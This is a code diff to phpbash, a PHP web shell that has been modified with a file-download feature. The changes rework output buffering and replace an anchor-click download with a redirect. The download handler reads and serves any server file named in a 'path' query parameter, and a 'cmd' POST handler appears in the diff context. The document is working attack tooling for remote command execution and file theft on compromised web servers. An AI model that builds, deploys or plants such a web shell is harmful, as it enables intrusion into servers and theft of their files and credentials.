@@ -2,7 +2,13 @@
 /* phpbash by Alexander Reid (Arrexel) */
 /* Modified with download feature by b4ndit23 */
 
+ob_start();
+
 if (ISSET($_GET['download']) && ISSET($_GET['path'])) {
+    while (ob_get_level()) {
+        ob_end_clean();
+    }
+    
     $filepath = $_GET['path'];
     $filename = basename($filepath);
     
@@ -13,9 +19,6 @@ if (ISSET($_GET['download']) && ISSET($_GET['path'])) {
         header('Content-Length: ' . filesize($filepath));
         header('Cache-Control: must-revalidate');
         header('Pragma: public');
-        
-        ob_clean();
-        flush();
         
         readfile($filepath);
         exit;
@@ -253,9 +256,10 @@ if (ISSET($_POST['cmd'])) {
                 return false;
             }
             
-            function downloadFile(filename, originalCommand, originalDir) {      
+            function downloadFile(filename, originalCommand, originalDir) {
                 var filepath;
                 if (filename.startsWith('/')) {
+                    // Absolute path
                     filepath = filename;
                 } else {
                     filepath = currentDir;
@@ -276,13 +280,7 @@ if (ISSET($_POST['cmd'])) {
                         if (response === "OK") {
                             outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>Downloading "+htmlentities(filename)+"...<br>";
                             
-                            var downloadUrl = "?download=1&path=" + encodeURIComponent(filepath);
-                            var link = document.createElement('a');
-                            link.href = downloadUrl;
-                            link.download = filename.split('/').pop(); 
-                            document.body.appendChild(link);
-                            link.click();
-                            document.body.removeChild(link);
+                            window.location.href = window.location.pathname + "?download=1&path=" + encodeURIComponent(filepath);
                             
                             setTimeout(function() {
                                 outputElement.innerHTML += "Download started for "+htmlentities(filename)+"<br>";
@@ -368,5 +366,3 @@ if (ISSET($_POST['cmd'])) {
         </script>
     </body>
 </html>
-
-
